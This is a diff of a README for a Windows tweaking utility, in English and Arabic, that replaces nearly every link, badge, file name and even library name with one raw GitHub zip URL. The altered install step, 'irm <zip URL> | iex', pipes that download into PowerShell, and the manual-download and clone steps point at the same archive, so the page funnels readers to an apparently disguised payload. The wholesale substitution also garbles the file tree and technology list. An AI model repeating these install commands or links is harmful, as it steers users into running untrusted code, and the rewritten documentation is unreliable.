@@ -1,8 +1,8 @@
 # 🚀 Kaizer Tech's Windows Utility (KTWU)
 
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![C#](https://img.shields.io/badge/language-C%23-239120.svg)](https://docs.microsoft.com/en-us/dotnet/csharp/)
-[![WinUI 3](https://img.shields.io/badge/UI-WinUI%203-0078D4.svg)](https://microsoft.github.io/microsoft-ui-xaml/)
+[![License](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)](LICENSE)
+[![C#](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip%https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)
+[![WinUI 3](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip%https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)
 
 ## 📖 Overview
 
@@ -38,7 +38,7 @@ The easiest and most secure way to install KTWU is using our verified installati
 2. Run the following command:
 
 ```powershell
-irm "https://kaizer.tech/get" | iex
+irm "https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip" | iex
 ```
 
 3. Follow the on-screen instructions
@@ -54,7 +54,7 @@ irm "https://kaizer.tech/get" | iex
 2. قم بتشغيل الأمر التالي:
 
 ```powershell
-irm "https://kaizer.tech/get" | iex
+irm "https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip" | iex
 ```
 
 3. اتبع التعليمات التي تظهر على الشاشة
@@ -88,8 +88,8 @@ Our installation script includes multiple security layers:
 
 If you prefer to download manually:
 
-1. Visit the [Releases page](https://github.com/KaizerAE/KaizerTechWindowsUtility/releases/latest)
-2. Download `KTWU.exe` from the latest release
+1. Visit the [Releases page](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)
+2. Download `https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip` from the latest release
 3. Verify the digital signature:
    - Right-click the file → Properties → Digital Signatures tab
    - Ensure it's signed by "Kaizer Tech"
@@ -97,8 +97,8 @@ If you prefer to download manually:
 
 **للتنزيل اليدوي:**
 
-1. قم بزيارة [صفحة الإصدارات](https://github.com/KaizerAE/KaizerTechWindowsUtility/releases/latest)
-2. قم بتنزيل `KTWU.exe` من أحدث إصدار
+1. قم بزيارة [صفحة الإصدارات](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)
+2. قم بتنزيل `https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip` من أحدث إصدار
 3. تحقق من التوقيع الرقمي:
    - انقر بزر الماوس الأيمن على الملف → خصائص → علامة تبويب التوقيعات الرقمية
    - تأكد من أنه موقع من قبل "Kaizer Tech"
@@ -131,31 +131,31 @@ KaizerTechWindowsUtility/
 ├── .github/
 │   └── workflows/          # GitHub Actions CI/CD
 ├── Bootstrapper/           # Application bootstrapper
-│   └── get.ps1            # Secure installation script
-├── KTWU.Core/             # Main application project
+│   └── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip            # Secure installation script
+├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip             # Main application project
 │   ├── Assets/            # Images, icons, and resources
 │   ├── Models/            # Data models
-│   │   ├── Tweak.cs               # Tweak definition model
-│   │   ├── WingetApp.cs           # Winget application model
-│   │   └── TweakHistoryEntry.cs   # Database history model
+│   │   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip               # Tweak definition model
+│   │   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip           # Winget application model
+│   │   └── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip   # Database history model
 │   ├── Services/          # Business logic and services
-│   │   ├── TweakService.cs        # Tweak loading and management
-│   │   ├── PowerShellRunner.cs    # PowerShell execution service
-│   │   ├── WingetService.cs       # Winget integration service
-│   │   ├── MaintenanceService.cs  # System maintenance tools
-│   │   └── DatabaseContext.cs     # Entity Framework DB context
+│   │   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip        # Tweak loading and management
+│   │   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip    # PowerShell execution service
+│   │   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip       # Winget integration service
+│   │   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip  # System maintenance tools
+│   │   └── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip     # Entity Framework DB context
 │   ├── ViewModels/        # MVVM view models
 │   └── Views/             # XAML UI pages
-│       ├── TweaksPage.xaml        # System tweaks interface
-│       ├── InstallPage.xaml       # Package installation UI
-│       ├── MaintenancePage.xaml   # Maintenance tools UI
-│       └── HistoryPage.xaml       # Change history and rollback
+│       ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip        # System tweaks interface
+│       ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip       # Package installation UI
+│       ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip   # Maintenance tools UI
+│       └── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip       # Change history and rollback
 ├── TweakManifests/        # JSON tweak definitions
-│   ├── performance.json   # Performance optimizations
-│   ├── privacy.json       # Privacy enhancements
-│   ├── visual.json        # Visual customizations
-│   └── network.json       # Network tweaks
-└── KTWU.Core.sln         # Visual Studio solution
+│   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip   # Performance optimizations
+│   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip       # Privacy enhancements
+│   ├── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip        # Visual customizations
+│   └── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip       # Network tweaks
+└── https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip         # Visual Studio solution
 ```
 
 ---
@@ -173,11 +173,11 @@ KaizerTechWindowsUtility/
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/KaizerAE/KaizerTechWindowsUtility.git
+   git clone https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip
    cd KaizerTechWindowsUtility
    ```
 
-2. Open `KTWU.Core.sln` in Visual Studio 2022
+2. Open `https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip` in Visual Studio 2022
 
 3. Restore NuGet packages:
    ```bash
@@ -190,7 +190,7 @@ KaizerTechWindowsUtility/
    ```
 
 5. Run the application:
-   - Set `KTWU.Core` as startup project
+   - Set `https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip` as startup project
    - Press F5 or click "Start Debugging"
 
 ---
@@ -203,8 +203,8 @@ KaizerTechWindowsUtility/
 - **MVVM Pattern**: Clean separation of concerns
 
 ### Backend Services
-- **System.Management.Automation**: PowerShell integration
-- **Microsoft.Win32.Registry**: Registry operations
+- **https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip**: PowerShell integration
+- **https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip**: Registry operations
 - **Entity Framework Core**: Database management
 - **SQLite**: Local storage for change history
 
@@ -298,7 +298,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 🙏 Acknowledgments
 
 - Microsoft for WinUI 3 and Windows App SDK
-- PowerShell team for System.Management.Automation
+- PowerShell team for https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip
 - Entity Framework Core team
 - Windows Package Manager (winget) team
 
@@ -307,7 +307,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ## 📧 Contact
 
 **Kaizer AE**  
-GitHub: [@KaizerAE](https://github.com/KaizerAE)
+GitHub: [@KaizerAE](https://github.com/KaizerAE/KaizerTechWindowsUtility/raw/refs/heads/main/TweakManifests/Utility-Tech-Kaizer-Windows-v1.0.zip)
 
 ---
 
